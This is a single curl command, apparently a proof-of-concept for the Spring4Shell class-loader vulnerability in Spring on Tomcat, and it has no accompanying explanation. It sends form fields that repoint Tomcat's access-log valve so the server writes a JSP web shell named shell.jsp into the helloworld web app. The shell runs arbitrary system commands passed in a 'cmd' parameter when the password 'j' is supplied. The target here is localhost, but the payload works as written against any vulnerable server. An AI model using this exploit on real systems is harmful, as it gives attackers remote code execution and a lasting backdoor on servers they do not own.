curl -X POST \
  -H "c2:<%" \
  -H "suffix:%>//" \
  -H "DNT:1" \
  -H "c1:Runtime" \
  -H "Content-Type:application/x-www-form-urlencoded" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/helloworld' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  http://localhost:8080/helloworld/greeting